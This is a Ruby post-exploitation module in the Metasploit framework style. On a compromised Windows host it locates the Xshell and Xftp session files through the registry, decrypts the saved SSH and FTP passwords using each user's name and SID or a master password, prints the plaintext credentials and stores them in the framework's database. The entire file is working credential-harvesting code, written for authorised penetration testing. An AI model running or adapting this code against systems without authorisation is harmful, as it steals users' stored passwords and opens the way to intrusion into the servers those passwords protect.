##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/parser/ini'
require 'rex/parser/netsarang'
require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::File
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Accounts
  include Rex::Parser::NetSarang

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Xshell and Xftp Passwords',
        'Description' => %q{
          This module can decrypt the password of xshell and xftp,
          if the user chooses to remember the password.
        },
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://github.com/HyperSine/how-does-Xmanager-encrypt-password/blob/master/doc/how-does-Xmanager-encrypt-password.md']
        ],
        'Author' => [
          'Kali-Team'
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ]
      )
    )
    register_options(
      [
        OptString.new('MASTER_PASSWORD', [ false, 'If the user sets the master password, e.g.:123456']),
      ]
    )
  end

  def try_encode_file(data)
    # version 6.0 The character set of the session file will use Unicode
    # version <= 5.3 The character set of the session file will use ANSI
    if data[0].unpack('C') == [255] && data[1].unpack('C') == [254]
      data[2..-1].force_encoding('UTF-16LE').encode('UTF-8')
    elsif data[0].unpack('C') == [254] && data[1].unpack('C') == [187] && data[2].unpack('C') == [191]
      data
    elsif data[0].unpack('C') == [254] && data[1].unpack('C') == [255]
      data[2..-1].force_encoding('UTF-16BE').encode('UTF-8')
    else
      data
    end
  end

  def enable_master_passwd?(version_6_path)
    file_path = expand_path(version_6_path + '\\Common\\MasterPassword.mpw')
    file = read_file(file_path) if session.fs.file.exist?(file_path)
    raise 'No data to parse' if file.nil? || file.empty?

    file = try_encode_file(file)
    file.include?('EnblMasterPasswd=1')
  end

  def net_sarang_store_config(config)
    service_data = {
      address: config[:host],
      port: config[:port],
      service_name: config[:type],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :session,
      session_id: session_db_id,
      post_reference_name: refname,
      private_type: :password,
      private_data: config[:password],
      username: config[:username]
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def enum_version_5_session_file(path, user_profiles)
    xsh = session.fs.file.search(path, '*.xsh')
    xfp = session.fs.file.search(path, '*.xfp')
    columns = [
      'Type',
      'Name',
      'Host',
      'Port',
      'UserName',
      'Plaintext',
      'Password'
    ]
    tbl = Rex::Text::Table.new(
      'Header' => "UserName: #{path}",
      'Columns' => columns
    )
    xsh.each do |item|
      file = read_file(item['path'] + session.fs.file.separator + item['name'])
      raise 'No data to parse' if file.nil? || file.empty?

      file = try_encode_file(file)
      ini = Rex::Parser::Ini.from_s(file)
      version, host, port, username, password = parser_xsh(ini)
      xshell = NetSarangCrypto.new('xshell', version, user_profiles['UserName'], user_profiles['SID'])
      xshell_plaintext, _is_valid = xshell.decrypt_string(password) if password
      config = {
        type: 'ssh',
        host: host,
        port: port,
        username: username,
        password: xshell_plaintext
      }
      net_sarang_store_config(config)
      tbl << ['Xshell_V' + version.to_s, item['name'], host, port, username, xshell_plaintext, password]
    end
    xfp.each do |item|
      file = read_file(item['path'] + session.fs.file.separator + item['name'])
      raise 'No data to parse' if file.nil? || file.empty?

      file = try_encode_file(file)
      ini = Rex::Parser::Ini.from_s(file)
      version, host, port, username, password = parser_xfp(ini)
      xftp = NetSarangCrypto.new('xftp', version, user_profiles['UserName'], user_profiles['SID'])
      xftp_plaintext, _is_valid = xftp.decrypt_string(password) if password
      config = {
        type: 'ftp',
        host: host,
        port: port,
        username: username,
        password: xftp_plaintext
      }
      net_sarang_store_config(config)
      tbl << ['Xftp_V' + version.to_s, item['name'], host, port, username, xftp_plaintext, password]
    end
    print_line(tbl.to_s)
  end

  def enum_version_6_session_file(path, user_profiles)
    xsh = session.fs.file.search(path, '*.xsh')
    xfp = session.fs.file.search(path, '*.xfp')
    columns = [
      'Type',
      'Name',
      'Host',
      'Port',
      'UserName',
      'Plaintext',
      'Password'
    ]
    tbl = Rex::Text::Table.new(
      'Header' => "UserName: #{path}",
      'Columns' => columns
    )
    xsh.each do |item|
      file = read_file(item['path'] + session.fs.file.separator + item['name'])
      raise 'No data to parse' if file.nil? || file.empty?

      file = try_encode_file(file)
      ini = Rex::Parser::Ini.from_s(file)
      version, host, port, username, password = parser_xsh(ini)
      xshell = NetSarangCrypto.new('xshell', version, user_profiles['UserName'], user_profiles['SID'])
      xshell = NetSarangCrypto.new('xshell', version, user_profiles['UserName'], user_profiles['SID'], datastore['MASTER_PASSWORD']) if enable_master_passwd?(path)
      is_valid = true
      xshell_plaintext, is_valid = xshell.decrypt_string(password) if password
      print_error('Invalid MASTER_PASSWORD, Decryption failed!') if !is_valid
      config = {
        type: 'ssh',
        host: host,
        port: port,
        username: username,
        password: xshell_plaintext
      }
      net_sarang_store_config(config)
      tbl << ['Xshell_V' + version.to_s, item['name'], host, port, username, xshell_plaintext, password]
    end
    xfp.each do |item|
      file = read_file(item['path'] + session.fs.file.separator + item['name'])
      raise 'No data to parse' if file.nil? || file.empty?

      file = try_encode_file(file)
      ini = Rex::Parser::Ini.from_s(file)
      version, host, port, username, password = parser_xfp(ini)
      xftp = NetSarangCrypto.new('xftp', version, user_profiles['UserName'], user_profiles['SID'])
      xftp = NetSarangCrypto.new('xftp', version, user_profiles['UserName'], user_profiles['SID'], datastore['MASTER_PASSWORD']) if enable_master_passwd?(path)
      is_valid = true
      xftp_plaintext, is_valid = xftp.decrypt_string(password) if password
      print_error('Invalid MASTER_PASSWORD, Decryption failed!') if !is_valid
      config = {
        type: 'ftp',
        host: host,
        port: port,
        username: username,
        password: xftp_plaintext
      }
      net_sarang_store_config(config)
      tbl << ['Xftp_V' + version.to_s, item['name'], host, port, username, xftp_plaintext, password]
    end
    print_line(tbl.to_s)
  end

  def run
    profiles = grab_user_profiles
    profiles.each do |user_profiles|
      next if user_profiles['SID'].nil?

      parent_key_6 = "HKEY_USERS\\#{user_profiles['SID']}\\Software\\NetSarang\\Common\\6\\UserData"
      parent_key_5 = "HKEY_USERS\\#{user_profiles['SID']}\\Software\\NetSarang\\Common\\5\\UserData"
      # get session file path
      net_sarang_path_6 = expand_path(registry_getvaldata(parent_key_6, 'UserDataPath'))
      net_sarang_path_5 = expand_path(registry_getvaldata(parent_key_5, 'UserDataPath'))

      # enum session file
      enum_version_5_session_file(net_sarang_path_5, user_profiles) if session.fs.file.exist?(net_sarang_path_5)
      enum_version_6_session_file(net_sarang_path_6, user_profiles) if session.fs.file.exist?(net_sarang_path_6)
    end
  end
end
